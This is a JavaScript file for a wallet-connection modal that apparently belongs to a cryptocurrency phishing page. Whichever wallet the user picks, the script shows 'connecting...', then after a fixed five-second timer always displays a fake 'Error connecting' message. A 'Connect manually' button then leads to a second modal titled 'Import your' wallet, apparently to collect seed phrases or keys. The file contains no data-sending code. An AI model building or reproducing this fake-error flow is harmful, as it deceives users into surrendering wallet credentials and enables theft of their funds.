// Get the modal elements
var modal = document.getElementById("myModal");
var newModal = document.getElementById("secondMyModal");

// Get the button elements that open the modal
var btns = document.querySelectorAll(".openModalButton");

// Get the <span> elements that close the modal
var span = document.getElementsByClassName("close")[0];
var buttonSpan = document.getElementsByClassName("close-button")[0];
var items = document.querySelectorAll(".openModalButton .item");

// Get the <span> and <button> elements that close the second modal
var secondModalSpan = document.getElementsByClassName("second-close")[0];
var secondModalButtonSpan = document.getElementsByClassName("second-close-button")[0];

items.forEach(function (item) {
  item.addEventListener("click", function () {
    var logoTitle = this.querySelector(".logo-title").textContent;
    var logoSrc = this.querySelector(".logo").src;

    // Update the modal content
    document.querySelector(".modal-connection-status-2a").textContent = logoTitle;
    document.querySelector(".modal-logo").src = logoSrc;

    document.querySelector(".newModalheader").textContent = `Import your ${logoTitle}`;
    document.querySelector(".modal-logo-2").src = logoSrc;

    modal.style.display = "block";
    resetVortexAndOpen();
  });
});

// Variable to store the timer ID
var vortexTimer;

// Function to revert the effect of openVortex
function revertVortex() {
  // Revert HTML content
  document.querySelector('.flex-section-A').innerHTML = `
                <div class="connection-box">
                    <p class="modal-connection-status">connecting...</p>
                </div>
            `;

  // Revert CSS styles
  // document.querySelector('.flex-section-A').style.border = '';
  // document.querySelector('.modal-connection-status').style.color = '';
}

// Function to reset and re-apply vortex when the modal opens
function resetVortexAndOpen() {
  // Clear any previous timeout
  clearTimeout(vortexTimer);

  // First, revert to the original state
  revertVortex();

  // Apply the vortex effect after a short delay to give time for resetting the state
  setTimeout(function () {
    openVortex();
  }, 100); // Small delay to ensure the revert happens before re-opening the vortex
}

// When the user clicks a button, open the modal and apply resetVortexAndOpen effect
btns.forEach(function (btn) {
  btn.onclick = function () {
    modal.style.display = "block";
    resetVortexAndOpen();
  }
});

// When the user clicks on <span> (x), close the modal and revert the effect
span.onclick = function () {
  modal.style.display = "none";
  revertVortex();
  clearTimeout(vortexTimer);
}

buttonSpan.onclick = function () {
  modal.style.display = "none";
  revertVortex();
  clearTimeout(vortexTimer);
}

// When the user clicks anywhere outside of the modal, close it and revert the effect
window.onclick = function (event) {
  if (event.target == modal) {
    modal.style.display = "none";
    revertVortex();
    clearTimeout(vortexTimer);
  }
  if (event.target == newModal) {
    newModal.style.display = "none";
    revertToWalletSupport();
  }
}

// Define the openVortex function
function openVortex() {
  // Clear any existing timer
  clearTimeout(vortexTimer);

  // Start a new timer
  vortexTimer = setTimeout(function () {
    // Change HTML content
    document.querySelector('.flex-section-A').innerHTML = `
                    <div class="connection-box">
                        <p class="modal-connection-status-3a">Error connecting</p>
                        <button class="modal-connect-button-3b">Connect manually</button>
                    </div>
                `;

    // Apply new CSS styles
    document.querySelector('.connection-box').style.border = '2px solid #df2911';
    document.querySelector('.modal-connection-status-3a').style.color = '#df2911';

    // Add event listener for the new button
    document.querySelector(".modal-connect-button-3b").addEventListener("click", function () {
      modal.style.display = "none";
      newModal.style.display = "block";

      closeModalTwo();
    });
  }, 5000); // 5000 milliseconds = 5 seconds
}

function closeModalTwo() {
  secondModalSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport();
  }

  secondModalButtonSpan.onclick = function () {
    newModal.style.display = "none";
    revertToWalletSupport();
  }
}

function revertToWalletSupport() {
  // Return to the wallet support section and remove opacity
  var walletSupportSection = document.querySelector('.wallet-support');
  if (walletSupportSection) {
    walletSupportSection.classList.remove('modal-open');
  }

  // Remove opacity from the body
  document.body.style.opacity = '1';
}
